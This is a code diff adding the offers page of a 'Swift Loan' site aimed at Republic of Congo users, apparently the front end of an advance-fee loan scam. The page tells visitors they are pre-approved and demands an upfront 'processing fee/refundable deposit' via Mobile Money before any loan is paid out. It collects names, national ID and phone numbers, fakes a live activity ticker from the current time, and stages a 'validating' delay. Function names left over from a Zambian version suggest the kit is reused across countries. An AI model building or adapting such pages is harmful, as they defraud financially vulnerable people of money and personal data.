+                            <span class="font-semibold text-gray-700">You'll receive:</span>
+                            <span class="font-bold text-primary text-lg">XAF 860,856</span>
+                        </div>
+                        <div class="monthly-payment-info bg-blue-50 p-2 rounded-lg">
+                            <div class="flex justify-between text-sm">
+                                <span class="text-gray-600">Monthly Payment:</span>
+                                <span class="font-semibold text-blue-600">XAF <span class="monthly-amount">61,950</span></span>
+                            </div>
+                        </div>
+                    </div>
+                    <button class="w-full bg-primary text-white py-3 px-4 rounded-lg font-semibold hover:bg-primary-dark transition-colors duration-200 select-offer-btn">
+                        Select This Offer
+                    </button>
+                </div>
+            </div>
+        </div>
+    </main>
+
+    <!-- Welcome Popup -->
+    <div id="welcomePopup" class="welcome-popup fixed inset-0 z-50 hidden items-center justify-center p-4">
+        <div id="welcomeContent" class="bg-white rounded-2xl shadow-2xl max-w-md w-full p-8 text-center transform scale-95 opacity-0 transition-all duration-300">
+            <div class="mb-6">
+                <div class="w-20 h-20 bg-primary rounded-full flex items-center justify-center mx-auto mb-4">
+                    <svg class="text-white" width="40" height="40" fill="currentColor" viewBox="0 0 24 24">
+                        <path d="M9 12l2 2 4-4m6 2a9 9 0 11-18 0 9 9 0 0118 0z"/>
+                    </svg>
+                </div>
+                <h2 class="text-2xl font-bold text-gray-900 mb-2">Congratulations!</h2>
+                <p class="text-gray-600">
+                    You're pre-approved for multiple loan offers based on your profile. Choose the offer that best suits your needs.
+                </p>
+            </div>
+            
+            <div class="bg-primary-light rounded-lg p-4 mb-6">
+                <p class="text-sm text-gray-700">
+                    <strong class="text-primary">Quick Tip:</strong> Select an offer to see detailed terms and complete your application in minutes!
+                </p>
+            </div>
+
+            <div class="flex gap-3">
+                <button id="closeWelcomeBtn" class="flex-1 bg-gray-200 text-gray-700 py-3 px-4 rounded-lg font-semibold hover:bg-gray-300 transition-colors duration-200">
+                    Close
+                </button>
+                <button id="gotItBtn" class="flex-1 bg-primary text-white py-3 px-4 rounded-lg font-semibold hover:bg-primary-dark transition-colors duration-200">
+                    Got it!
+                </button>
+            </div>
+        </div>
+    </div>
+
+    <!-- Loan Confirmation Modal -->
+    <div id="loanModal" class="fixed inset-0 z-50 hidden">
+        <div class="modal-overlay fixed inset-0" onclick="hideLoanModal()"></div>
+        <div class="flex items-center justify-center min-h-screen p-4">
+            <div class="modal-content bg-white rounded-2xl shadow-2xl max-w-2xl w-full relative">
+                <!-- Close button -->
+                <button id="closeModal" class="absolute top-4 right-4 text-gray-400 hover:text-gray-600 transition-colors">
+                    <svg width="24" height="24" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24">
+                        <path stroke-linecap="round" stroke-linejoin="round" d="M6 18L18 6M6 6l12 12"/>
+                    </svg>
+                </button>
+
+                <!-- Modal Header -->
+                <div class="p-6 border-b border-gray-200">
+                    <h2 id="modalOfferTitle" class="text-2xl font-bold text-gray-900">Confirm Loan Application</h2>
+                    <p class="text-sm text-gray-500 mt-1">Review your loan details and provide your Mobile Money number</p>
+                </div>
+
+                <!-- Modal Body -->
+                <div class="p-6 max-h-[calc(95vh-200px)] overflow-y-auto">
+                    <!-- Loan Summary -->
+                    <div class="bg-gradient-to-r from-primary-light to-orange-50 rounded-xl p-6 mb-6">
+                        <h3 class="font-bold text-gray-900 mb-4 flex items-center">
+                            <svg class="mr-2 text-primary" width="20" height="20" fill="currentColor" viewBox="0 0 24 24">
+                                <path d="M9 12l2 2 4-4m6 2a9 9 0 11-18 0 9 9 0 0118 0z"/>
+                            </svg>
+                            Loan Summary
+                        </h3>
+                        <div class="space-y-3">
+                            <div class="flex justify-between">
+                                <span class="text-gray-600">Loan Amount:</span>
+                                <span id="modalAmount" class="font-bold text-gray-900">XAF 0</span>
+                            </div>
+                            <div class="flex justify-between">
+                                <span class="text-gray-600">Processing Fee/refundable deposit:</span>
+                                <span id="modalFee" class="font-semibold text-orange-600">XAF 0</span>
+                            </div>
+                            <div class="flex justify-between pt-3 border-t border-gray-300">
+                                <span class="font-bold text-gray-900">You'll Receive:</span>
+                                <span id="modalReceive" class="font-bold text-primary text-lg">XAF 0</span>
+                            </div>
+                            <div class="flex justify-between">
+                                <span class="text-gray-600">Tracking Number:</span>
+                                <span id="modalTracking" class="font-mono text-sm bg-white px-2 py-1 rounded">LN-00000</span>
+                            </div>
+                            <div class="flex justify-between">
+                                <span class="text-gray-600">Monthly Payment:</span>
+                                <span id="modalMonthlyPayment" class="font-bold text-blue-600">XAF 0</span>
+                            </div>
+                            <div class="flex justify-between">
+                                <span class="text-gray-600">Repayment Period:</span>
+                                <span id="modalRepayment" class="font-semibold text-purple-600">0 months</span>
+                            </div>
+                        </div>
+                    </div>
+
+                    <!-- Phone Number Input -->
+                    <div class="mb-6">
+                        <label for="phoneInput" class="block text-sm font-semibold text-gray-700 mb-2">
+    Your active Mobile Money phone number (used for tracking, contacting you, and confirmation) e.g. 05XXXXXXX (Airtel) or 06XXXXXXX (MTN) <span class="text-red-500">*</span>
+</label>
+                        <div class="relative">
+                            <div class="absolute inset-y-0 left-0 flex items-center pl-3">
+                                <span class="text-gray-500 text-sm">+242</span>
+                            </div>
+                            <input 
+                                type="tel" 
+                                id="phoneInput" 
+                                class="phone-input w-full pl-16 pr-10 py-3 rounded-lg text-sm"
+                                placeholder="05XXXXXXX"
+                                maxlength="9"
+                                required
+                            >
+                            <div class="absolute inset-y-0 right-0 flex items-center pr-3">
+                                <svg id="phoneCheckIcon" class="hidden w-5 h-5 text-green-500" fill="currentColor" viewBox="0 0 24 24">
+                                    <path d="M9 12l2 2 4-4m6 2a9 9 0 11-18 0 9 9 0 0118 0z"/>
+                                </svg>
+                                <svg id="phoneErrorIcon" class="hidden w-5 h-5 text-red-500" fill="currentColor" viewBox="0 0 24 24">
+                                    <path d="M12 8v4m0 4h.01M21 12a9 9 0 11-18 0 9 9 0 0118 0z"/>
+                                </svg>
+                            </div>
+                        </div>
+                        <div id="phoneError" class="hidden text-red-500 text-xs mt-1"></div>
+                        <div class="text-gray-500 text-xs mt-1">
+                            Enter your number without +242 — starts with 05: Airtel Congo, starts with 06: MTN Congo. Network is auto-detected.
+                        </div>
+                    </div>
+
+                    <!-- Network Selection -->
+                    <div class="mb-6">
+                        <label for="networkSelect" class="block text-sm font-semibold text-gray-700 mb-2">
+                            Network (auto-detected from your number) <span class="text-red-500">*</span>
+                        </label>
+                        <div class="relative">
+                            <select id="networkSelect" class="w-full px-4 py-3 rounded-lg border border-gray-300 focus:ring-2 focus:ring-primary focus:border-transparent text-sm bg-white appearance-none" required>
+                                <option value="" disabled selected>Enter your number above to auto-detect</option>
+                                <option value="MTN">MTN Congo</option>
+                                <option value="AIRTEL">Airtel Congo</option>
+                            </select>
+                            <div class="absolute inset-y-0 right-0 flex items-center px-2 pointer-events-none">
+                                <svg class="w-4 h-4 text-gray-400" fill="none" stroke="currentColor" viewBox="0 0 24 24">
+                                    <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M19 9l-7 7-7-7"></path>
+                                </svg>
+                            </div>
+                        </div>
+                        <div id="networkError" class="hidden text-red-500 text-xs mt-1">Please select a network</div>
+                    </div>
+
+                    <!-- Terms and Conditions -->
+                    <div class="mb-6">
+                        <div class="p-4 bg-gradient-to-r from-blue-50 to-indigo-50 rounded-xl border-2 border-blue-200 hover:border-primary transition-all duration-300">
+                            <label class="flex items-start space-x-4 cursor-pointer">
+                                <input type="checkbox" id="termsCheckbox" class="custom-checkbox">
+                                <div class="text-sm text-gray-700 leading-relaxed flex-1">
+                                    <span class="font-semibold text-gray-900 block mb-2">Agreement Required <span class="text-red-500">*</span></span>
+                                    <div class="space-y-1">
+                                        <div>I agree to the <a href="#" class="text-primary hover:underline font-medium">Terms and Conditions</a></div>
+                                        <div>I accept the <a href="#" class="text-primary hover:underline font-medium">Privacy Policy</a> and <a href="#" class="text-primary hover:underline font-medium">Loan Agreement</a></div>
+                                    </div>
+                                </div>
+                            </label>
+                        </div>
+                        <div id="termsError" class="text-red-600 text-sm mt-2 hidden font-medium">
+                            Please accept all terms and conditions to proceed with your loan application.
+                        </div>
+                    </div>
+
+                    <!-- Submit Button -->
+                    <button 
+                        id="withdrawBtn" 
+                        class="w-full bg-primary text-white py-3 px-4 rounded-lg font-semibold hover:bg-primary-dark transition-colors duration-200 disabled:opacity-50 disabled:cursor-not-allowed"
+                        disabled
+                    >
+                        Confirm My Loan
+                    </button>
+                    
+                    <!-- Payment Failure Warning -->
+                    <div class="mt-4 p-4 bg-red-50 border border-red-200 rounded-lg">
+                        <div class="flex items-start space-x-3">
+                            <svg class="text-red-500 mt-0.5 flex-shrink-0" width="16" height="16" fill="currentColor" viewBox="0 0 24 24">
+                                <path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm-1 15h2v-2h-2v2zm0-4h2V7h-2v6z"/>
+                            </svg>
+                            <div class="text-sm text-red-700">
+                                <p class="font-semibold mb-1">Important Payment Notice</p>
+                                <p>KYC (Know Your Customer) is coming soon to improve security and trust of the loan Applicant.If payment fails, please ensure your Mobile Money number is active and has sufficient limits. Contact customer service if issues persist.</p>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- Processing Modal -->
+    <div id="processingModal" class="fixed inset-0 z-50 hidden">
+        <div class="modal-overlay fixed inset-0"></div>
+        <div class="flex items-center justify-center min-h-screen p-4">
+            <div class="bg-primary rounded-2xl shadow-2xl max-w-sm w-full p-8 text-center text-white">
+                <div class="processing-animation mb-6">
+                    <div class="w-16 h-16 bg-primary-dark rounded-full flex items-center justify-center mx-auto mb-4">
+                        <svg class="animate-spin text-white" width="32" height="32" fill="none" viewBox="0 0 24 24">
+                            <circle class="opacity-25" cx="12" cy="12" r="10" stroke="currentColor" stroke-width="4"></circle>
+                            <path class="opacity-75" fill="currentColor" d="M4 12a8 8 0 018-8V0C5.373 0 0 5.373 0 12h4zm2 5.291A7.962 7.962 0 014 12H0c0 3.042 1.135 5.824 3 7.938l3-2.647z"></path>
+                        </svg>
+                    </div>
+                    <h3 class="text-xl font-bold mb-2">
+                        Validating 
+                    </h3>
+                    <p class="text-sm opacity-90">
+                        Please wait while we prepare your loan wallet...
+                    </p>
+                </div>
+            </div>
+        </div>
+    </div>
+
+  <!-- Fee Explanation Modal -->
+<div id="feeModal" class="hidden fixed inset-0 modal-overlay z-50 flex items-center justify-center p-4">
+  <div class="bg-white rounded-2xl shadow-2xl max-w-md w-full flex flex-col" style="max-height:90vh;">
+    <!-- Header — always visible, never scrolls away -->
+    <div class="p-4 border-b border-gray-200 flex-shrink-0 bg-white rounded-t-2xl">
+      <div class="flex items-center justify-between">
+        <h2 class="text-lg font-bold text-gray-900">Processing Fee/refundable deposit (via Mobile Money)</h2>
+        <button onclick="hideFeeModal()" class="text-gray-400 hover:text-gray-600">
+          <svg width="20" height="20" fill="none" stroke="currentColor" viewBox="0 0 24 24">
+            <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M6 18L18 6M6 6l12 12"/>
+          </svg>
+        </button>
+      </div>
+    </div>
+
+    <!-- Body — scrollable -->
+    <div class="p-6 overflow-y-auto">
+      <div class="space-y-4 text-sm text-gray-700">
+        <p>
+          A one-time processing fee/refundable deposit is required to activate your loan. 
+          This payment is requested <b>securely via Mobile Money</b> before disbursement, and it ensures
+          smooth, fast, and reliable service for all customers.
+        </p>
+        
+        <ul class="list-disc list-inside space-y-2 ml-4">
+          <li>Credit scoring and risk evaluation</li>
+          <li>Customer verification and fraud prevention</li>
+          <li>System maintenance and platform security</li>
+          <li>Regulatory compliance and audit checks</li>
+          <li>24/7 customer support availability</li>
+          <li>Record keeping and loan tracking</li>
+        </ul>
+
+        <!-- Info Box -->
+        <div class="bg-blue-50 border border-blue-200 rounded-lg p-3 mt-4 flex items-start">
+          <svg class="w-5 h-5 text-blue-600 mr-2 flex-shrink-0" fill="none" stroke="currentColor" viewBox="0 0 24 24">
+            <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M13 16h-1v-4h-1m1-4h.01M12 20a8 8 0 100-16 8 8 0 000 16z"/>
+          </svg>
+          <p class="text-blue-800 text-xs">
+            The processing fee/refundable deposit is <b>stored securely</b> in our system. 
+            It is fully refundable and will be <b>returned to your Mobile Money wallet after you complete full loan repayment</b>.
+          </p>
+        </div>
+
+        <!-- Extra Assurance -->
+        <div class="bg-gray-50 border border-gray-200 rounded-lg p-3 mt-3 flex items-start">
+          <svg class="w-5 h-5 text-gray-600 mr-2 flex-shrink-0" fill="none" stroke="currentColor" viewBox="0 0 24 24">
+            <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M12 8v4l3 3m6-3a9 9 0 11-18 0 9 9 0 0118 0z"/>
+          </svg>
+          <p class="text-gray-700 text-xs">
+            If your loan is <b>not approved or disbursed</b>, 
+            the processing fee/refundable deposit will be <b>automatically reversed to your Mobile Money account</b>.
+          </p>
+        </div>
+
+        <!-- Reassurance -->
+        <div class="flex items-start mt-2 text-green-700 text-sm font-medium">
+          <svg class="w-5 h-5 text-green-600 mr-2 flex-shrink-0" fill="none" stroke="currentColor" viewBox="0 0 24 24">
+            <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M5 13l4 4L19 7"/>
+          </svg>
+          <p>
+            No hidden charges. Only this one-time processing fee/refundable deposit is required. 
+            Your full loan amount is sent to your Mobile Money wallet once payment is confirmed.
+          </p>
+        </div>
+
+        <!-- Agreement Text -->
+        <p class="mt-4 text-sm text-gray-700 font-medium text-center">
+          I understand and accept that the processing fee/refundable deposit is paid via Mobile Money, 
+          stored securely, refunded after full repayment, 
+          and reversed if the loan is not approved.
+        </p>
+
+        <!-- Understand Button -->
+        <div class="mt-6 text-center">
+          <button onclick="hideFeeModal()" 
+                  class="bg-primary text-white px-6 py-3 rounded-lg font-semibold hover:bg-primary-dark transition-colors">
+            I Understand
+          </button>
+        </div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    <script>
+console.log("Swift Loan Offers Page initialized");
+
+// Global variables
+let currentLoanData = {};
+
+// Load user data from localStorage (saved from eligibility.html)
+function loadUserData() {
+    console.log('Loading user data from localStorage...');
+    
+    let customerName = null;
+    let customerId = null;
+
+    // First, try to get data from the main eligibility form storage key
+    const eligibilityDataStr = localStorage.getItem('swiftLoanEligibilityData');
+    const personalDetailsStr = localStorage.getItem('swiftloan_personal_details');
+    
+    // We prefer swiftLoanEligibilityData since it's saved in eligibility.html
+    const dataStr = eligibilityDataStr || personalDetailsStr;
+    
+    if (dataStr) {
+        try {
+            const userData = JSON.parse(dataStr);
+            console.log('Found user data from storage:', userData);
+            
+            // Get full name from firstName and lastName
+            if (userData.firstName && userData.lastName) {
+                customerName = `${userData.firstName} ${userData.lastName}`;
+            } else if (userData.firstName) {
+                customerName = userData.firstName;
+            } else if (userData.lastName) {
+                customerName = userData.lastName;
+            }
+            
+            // Get national ID
+            if (userData.nationalId) {
+                customerId = userData.nationalId;
+            }
+            
+            console.log('Extracted Full Name:', customerName);
+            console.log('Extracted ID Number:', customerId);
+        } catch (e) {
+            console.error('Error parsing user data:', e);
+        }
+    }
+
+    // Fallback: Get parameters from URL if not found in localStorage
+    if (!customerName || !customerId) {
+        const urlParams = new URLSearchParams(window.location.search);
+        const nameFromURL = urlParams.get('name');
+        const idFromURL = urlParams.get('id');
+
+        if (nameFromURL && !customerName) {
+            customerName = nameFromURL;
+            console.log('Got name from URL:', customerName);
+        }
+        if (idFromURL && !customerId) {
+            customerId = idFromURL;
+            console.log('Got ID from URL:', customerId);
+        }
+    }
+
+    // Update the display elements
+    const cardNameElement = document.querySelector('.card-name');
+    const cardIdElement = document.querySelector('.card-id');
+
+    if (cardNameElement) {
+        cardNameElement.textContent = customerName || 'Guest User';
+    }
+
+    if (cardIdElement) {
+        cardIdElement.textContent = customerId || 'Not provided';
+    }
+
+    return { name: customerName, id: customerId };
+}
+
+// Calculate monthly payments
+async function calculateMonthlyPayment(amount, months) {
+    const monthlyRate = 0.0086;
+    const monthlyPayment = (amount * (1 + (monthlyRate * months))) / months;
+    return Math.round(monthlyPayment);
+}
+
+// Update monthly payments on all cards
+async function updateMonthlyPayments() {
+    const cards = document.querySelectorAll('.loan-card');
+    for (const card of cards) {
+        const amount = parseInt(card.getAttribute('data-amount'));
+        const months = parseInt(card.getAttribute('data-months'));
+        const fee = parseInt(card.getAttribute('data-fee'));
+        
+        const netAmount = amount - fee;
+        const monthlyPayment = await calculateMonthlyPayment(amount, months);
+        
+        const monthlyAmountEl = card.querySelector('.monthly-amount');
+        if (monthlyAmountEl) {
+            monthlyAmountEl.textContent = monthlyPayment.toLocaleString();
+        }
+    }
+}
+
+// Create confetti effect
+function createConfetti() {
+    const colors = ['#f39c12', '#e74c3c', '#3498db', '#2ecc71', '#9b59b6', '#FF6B00'];
+    for (let i = 0; i < 50; i++) {
+        const confetti = document.createElement('div');
+        confetti.className = 'confetti';
+        confetti.style.left = Math.random() * 100 + 'vw';
+        confetti.style.backgroundColor = colors[Math.floor(Math.random() * colors.length)];
+        confetti.style.animationDuration = (Math.random() * 2 + 2) + 's';
+        confetti.style.animationDelay = Math.random() * 2 + 's';
+        document.body.appendChild(confetti);
+        
+        setTimeout(() => confetti.remove(), 5000);
+    }
+}
+
+// Show welcome popup
+function showWelcomePopup() {
+    const popup = document.getElementById('welcomePopup');
+    const content = document.getElementById('welcomeContent');
+    
+    if (popup && content) {
+        popup.classList.remove('hidden');
+        popup.classList.add('flex');
+        
+        setTimeout(() => {
+            content.classList.remove('scale-95', 'opacity-0');
+            content.classList.add('scale-100', 'opacity-100');
+        }, 100);
+    }
+}
+
+// Hide welcome popup
+function hideWelcomePopup() {
+    const popup = document.getElementById('welcomePopup');
+    const content = document.getElementById('welcomeContent');
+    
+    if (popup && content) {
+        content.classList.remove('scale-100', 'opacity-100');
+        content.classList.add('scale-95', 'opacity-0');
+        
+        setTimeout(() => {
+            popup.classList.add('hidden');
+            popup.classList.remove('flex');
+        }, 300);
+    }
+}
+
+// Show fee explanation modal
+function showFeeModal() {
+    const modal = document.getElementById('feeModal');
+    modal.classList.remove('hidden');
+    modal.classList.add('flex');
+}
+
+// Hide fee explanation modal
+function hideFeeModal() {
+    const modal = document.getElementById('feeModal');
+    modal.classList.add('hidden');
+    modal.classList.remove('flex');
+}
+
+// Update ticker with real time
+function updateTickerTimes() {
+    const now = new Date();
+    const times = [
+        now.toLocaleTimeString('fr-CG', { hour12: false, hour: '2-digit', minute: '2-digit' }),
+        new Date(now - 2 * 60000).toLocaleTimeString('fr-CG', { hour12: false, hour: '2-digit', minute: '2-digit' }),
+        new Date(now - 5 * 60000).toLocaleTimeString('fr-CG', { hour12: false, hour: '2-digit', minute: '2-digit' }),
+        new Date(now - 8 * 60000).toLocaleTimeString('fr-CG', { hour12: false, hour: '2-digit', minute: '2-digit' }),
+        new Date(now - 12 * 60000).toLocaleTimeString('fr-CG', { hour12: false, hour: '2-digit', minute: '2-digit' }),
+        new Date(now - 15 * 60000).toLocaleTimeString('fr-CG', { hour12: false, hour: '2-digit', minute: '2-digit' })
+    ];
+
+    const currentTimeEl = document.getElementById('current-time');
+    if (currentTimeEl) {
+        currentTimeEl.textContent = `[${times[0]}] `;
+    }
+
+    for (let i = 2; i <= 6; i++) {
+        const timeEl = document.getElementById(`time-${i}`);
+        if (timeEl) {
+            timeEl.textContent = `[${times[i-1]}] `;
+        }
+    }
+}
+
+// Phone number validation for Congo (+242) format
+function validateZambianPhone(phone) {
+    const cleanPhone = phone.replace(/[\s-]/g, '');
+    // Validates 9-digit numbers: Airtel Congo (05), MTN Congo (06)
+    const phoneRegex = /^(05|06)\d{7}$/;
+    return phoneRegex.test(cleanPhone);
+}
+
+function detectZambianNetwork(phone) {
+    const p = phone.replace(/[\s-]/g, '');
+    if (p.startsWith('05')) return 'AIRTEL';
+    if (p.startsWith('06')) return 'MTN';
+    return '';
+}
+
+// Shared logic: validate + auto-detect network for a phone input element
+function applyPhoneDetection(inputEl) {
+    let phone = inputEl.value.replace(/\D/g, '');
+    if (phone.length > 9) phone = phone.substring(0, 9);
+    inputEl.value = phone;
+
+    if (phone.length === 0) {
+        updatePhoneValidation(inputEl, true);
+    } else if (phone.length < 9) {
+        updatePhoneValidation(inputEl, false, 'Phone number must be 9 digits (e.g. 05XXXXXXX or 06XXXXXXX)');
+    } else if (!/^(05|06)\d{7}$/.test(phone)) {
+        updatePhoneValidation(inputEl, false, 'Invalid Congo phone number. Use 05XXXXXXX (Airtel) or 06XXXXXXX (MTN)');
+    } else {
+        updatePhoneValidation(inputEl, true);
+    }
+
+    if (phone.length >= 2) {
+        const detected = detectZambianNetwork(phone);
+        const networkSelect = document.getElementById('networkSelect');
+        if (networkSelect) {
+            networkSelect.value = detected || '';
+            if (detected) document.getElementById('networkError').classList.add('hidden');
+        }
+    }
+
+    checkFormValidity();
+}
+
+// Format phone number display
+function formatPhoneNumber(phone) {
+    if (phone.length === 9) {
+        return `242${phone}`;
+    }
+    return phone;
+}
+
+// Update phone validation UI
+function updatePhoneValidation(input, isValid, errorMessage = '') {
+    const errorDiv = document.getElementById('phoneError');
+    const checkIcon = document.getElementById('phoneCheckIcon');
+    const errorIcon = document.getElementById('phoneErrorIcon');
+    
+    if (isValid) {
+        input.classList.remove('error');
+        input.classList.add('valid');
+        errorDiv.classList.add('hidden');
+        checkIcon.classList.remove('hidden');
+        errorIcon.classList.add('hidden');
+    } else {
+        input.classList.remove('valid');
+        input.classList.add('error');
+        errorDiv.textContent = errorMessage;
+        errorDiv.classList.remove('hidden');
+        checkIcon.classList.add('hidden');
+        errorIcon.classList.remove('hidden');
+    }
+}
+
+// Check if form is valid
+function checkFormValidity() {
+    const phoneInput = document.getElementById('phoneInput');
+    const termsCheckbox = document.getElementById('termsCheckbox');
+    const withdrawBtn = document.getElementById('withdrawBtn');
+    const networkSelect = document.getElementById('networkSelect');
+    
+    const isPhoneValid = validateZambianPhone(phoneInput.value);
+    const isTermsChecked = termsCheckbox.checked;
+    const isNetworkSelected = networkSelect.value !== '';
+    
+    withdrawBtn.disabled = !(isPhoneValid && isTermsChecked && isNetworkSelected);
+}
+
+// Show loan confirmation modal
+async function showLoanModal(loanData) {
+    currentLoanData = loanData;
+    
+    const monthlyPayment = await calculateMonthlyPayment(
+        parseInt(loanData.amount), 
+        parseInt(loanData.months)
+    );
+    
+    document.getElementById('modalOfferTitle').textContent = `Confirm ${loanData.offerName}`;
+    document.getElementById('modalAmount').textContent = `XAF ${parseFloat(loanData.amount).toLocaleString()}`;
+    document.getElementById('modalFee').textContent = `XAF ${parseFloat(loanData.fee).toLocaleString()}`;
+    document.getElementById('modalReceive').textContent = `XAF ${(parseFloat(loanData.amount) - parseFloat(loanData.fee)).toLocaleString()}`;
+    document.getElementById('modalTracking').textContent = loanData.tracking;
+    document.getElementById('modalMonthlyPayment').textContent = `XAF ${monthlyPayment.toLocaleString()}`;
+    document.getElementById('modalRepayment').textContent = `${loanData.months} months`;
+    
+    const phoneInput = document.getElementById('phoneInput');
+    let phoneToPrefill = '';
+    
+    // First try to get it from eligibility form data
+    const eligibilityDataStr = localStorage.getItem('swiftLoanEligibilityData');
+    if (eligibilityDataStr) {
+        try {
+            const eligibilityData = JSON.parse(eligibilityDataStr);
+            if (eligibilityData.phone) {
+                phoneToPrefill = eligibilityData.phone;
+            }
+        } catch(e) {
+            console.error('Error parsing eligibility data for phone:', e);
+        }
+    }
+    
+    // Fallback to older storage key
+    if (!phoneToPrefill) {
+        const storedPhone = localStorage.getItem('swift_customer_phone');
+        if (storedPhone) {
+            phoneToPrefill = storedPhone;
+        }
+    }
+    
+    if (phoneToPrefill) {
+        // Set exactly what the user filled, stripping '260' prefix if present
+        phoneInput.value = phoneToPrefill.replace(/^(\+?242)/, '');
+        // Run detection & validation for the auto-filled value
+        applyPhoneDetection(phoneInput);
+    }
+    
+    document.getElementById('termsCheckbox').checked = false;
+    document.getElementById('withdrawBtn').disabled = true;
+    
+    if (!phoneToPrefill) {
+        phoneInput.classList.remove('error', 'valid');
+        document.getElementById('phoneError').classList.add('hidden');
+        document.getElementById('phoneCheckIcon').classList.add('hidden');
+        document.getElementById('phoneErrorIcon').classList.add('hidden');
+    }
+    
+    document.getElementById('loanModal').classList.remove('hidden');
+    document.body.style.overflow = 'hidden';
+}
+
+// Hide loan modal
+function hideLoanModal() {
+    document.getElementById('loanModal').classList.add('hidden');
+    document.body.style.overflow = 'auto';
+}
+
+// Show processing modal
+function showProcessingModal() {
+    hideLoanModal();
+    document.getElementById('processingModal').classList.remove('hidden');
+}
+
+// Hide processing modal
+function hideProcessingModal() {
+    document.getElementById('processingModal').classList.add('hidden');
+    document.body.style.overflow = 'auto';
+}
+
+// Process loan withdrawal - REDIRECTS TO loan-withdrawal.html
+function processLoanWithdrawal() {
+    const phoneInput = document.getElementById('phoneInput');
+    const phone = phoneInput.value;
+    const networkSelect = document.getElementById('networkSelect');
+    const networkError = document.getElementById('networkError');
+    
+    if (!validateZambianPhone(phone)) {
+        updatePhoneValidation(phoneInput, false, 'Please enter a valid Congo phone number (05XXXXXXX or 06XXXXXXX)');
+        return;
+    }
+    
+    if (!networkSelect.value) {
+        networkError.classList.remove('hidden');
+        return;
+    } else {
+        networkError.classList.add('hidden');
+    }
+    
+    const termsCheckbox = document.getElementById('termsCheckbox');
+    const termsError = document.getElementById('termsError');
+    
+    if (!termsCheckbox.checked) {
+        termsCheckbox.classList.add('error');
+        termsError.classList.remove('hidden');
+        setTimeout(() => termsCheckbox.classList.remove('error'), 500);
+        alert('Please accept the terms and conditions to continue.');
+        return;
+    }
+    
+    // Store loan data for loan-withdrawal.html to read
+    const selectedOffer = {
+        ...currentLoanData,
+        phone: formatPhoneNumber(phone),
+        network: networkSelect.value,
+        timestamp: new Date().toISOString()
+    };
+    
+    localStorage.setItem('swift_selected_offer', JSON.stringify(selectedOffer));
+    localStorage.setItem('swift_customer_phone', formatPhoneNumber(phone));
+    localStorage.setItem('swift_selected_network', networkSelect.value);
+    
+    console.log('Processing loan withdrawal:', selectedOffer);
+    
+    showProcessingModal();
+    
+    // Redirect to loan-withdrawal.html after processing animation
+    setTimeout(() => {
+        hideProcessingModal();
+        window.location.href = 'loan-withdrawal.html';
+    }, 10000);
+}
+
+// Add button loading animation
+function addButtonLoading(button) {
+    button.classList.add('button-loading');
+    button.disabled = true;
+}
+
+// Remove button loading animation
+function removeButtonLoading(button) {
+    button.classList.remove('button-loading');
+    button.disabled = false;
+}
+
+// Enhanced select loan offer function with animation
+function selectLoanOffer(card) {
+    const button = card.querySelector('button');
+    
+    addButtonLoading(button);
+    
+    setTimeout(() => {
+        removeButtonLoading(button);
+        
+        const amount = card.getAttribute('data-amount');
+        const fee = card.getAttribute('data-fee');
+        const tracking = card.getAttribute('data-tracking');
+        const months = card.getAttribute('data-months');
+        const offerName = card.getAttribute('data-offer-name');
+
+        const loanData = {
+            amount: amount,
+            fee: fee,
+            tracking: tracking,
+            months: months,
+            offerName: offerName
+        };
+
+        console.log('Selected loan offer:', loanData);
+        showLoanModal(loanData);
+    }, 1000);
+}
+
+// Reveal loan cards one by one with animation
+function revealLoanCards() {
+    const loanCards = document.querySelectorAll('.loan-card');
+    const loadingMessage = document.getElementById('loadingMessage');
+    const userInfoCard = document.getElementById('userInfoCard');
+    
+    let delay = 0;
+    
+    loanCards.forEach((card, index) => {
+        setTimeout(() => {
+            card.style.display = 'block';
+            card.style.opacity = '0';
+            setTimeout(() => {
+                card.style.transition = 'opacity 0.5s ease-in-out';
+                card.style.opacity = '1';
+            }, 50);
+            
+            // Hide loading message and show user info after first card
+            if (index === 0) {
+                loadingMessage.style.display = 'none';
+                userInfoCard.style.display = 'block';
+            }
+            
+            // Show welcome popup after all cards are revealed
+            if (index === loanCards.length - 1) {
+                setTimeout(showWelcomePopup, 500);
+            }
+        }, delay);
+        
+        delay += 800; // 800ms delay between each card
+    });
+}
+
+// Initialize page
+document.addEventListener('DOMContentLoaded', function() {
+    console.log('Page loaded - starting initialization');
+    
+    const userData = loadUserData();
+    console.log('User data loaded successfully:', userData);
+    
+    updateMonthlyPayments();
+    createConfetti();
+    
+    // Start revealing cards after 2 seconds
+    setTimeout(revealLoanCards, 2000);
+    
+    updateTickerTimes();
+    setInterval(updateTickerTimes, 30000);
+    
+    const loanCards = document.querySelectorAll('.loan-card');
+    loanCards.forEach(card => {
+        const button = card.querySelector('button');
+        if (button) {
+            button.addEventListener('click', function(e) {
+                e.preventDefault();
+                selectLoanOffer(card);
+            });
+        }
+    });
+
+    const phoneInput = document.getElementById('phoneInput');
+    if (phoneInput) {
+        phoneInput.addEventListener('input', function () {
+            applyPhoneDetection(this);
+        });
+        // Handle paste — value isn't updated yet at paste-time, so defer by one tick
+        phoneInput.addEventListener('paste', function () {
+            setTimeout(() => applyPhoneDetection(this), 0);
+        });
+    }
+
+    const networkSelect = document.getElementById('networkSelect');
+    if (networkSelect) {
+        networkSelect.addEventListener('change', function() {
+            if (this.value) {
+                document.getElementById('networkError').classList.add('hidden');
+            }
+            checkFormValidity();
+        });
+    }
+    
+    const termsCheckbox = document.getElementById('termsCheckbox');
+    if (termsCheckbox) {
+        termsCheckbox.addEventListener('change', function() {
+            const checkbox = this;
+            const termsError = document.getElementById('termsError');
+            
+            if (checkbox.checked) {
+                checkbox.classList.remove('error');
+                termsError.classList.add('hidden');
+            } else {
+                termsError.classList.remove('hidden');
+            }
+            
+            checkFormValidity();
+        });
+    }
+    
+    const withdrawBtn = document.getElementById('withdrawBtn');
+    if (withdrawBtn) {
+        withdrawBtn.addEventListener('click', processLoanWithdrawal);
+    }
+    
+    const feeLinks = document.querySelectorAll('.explain-fee-link');
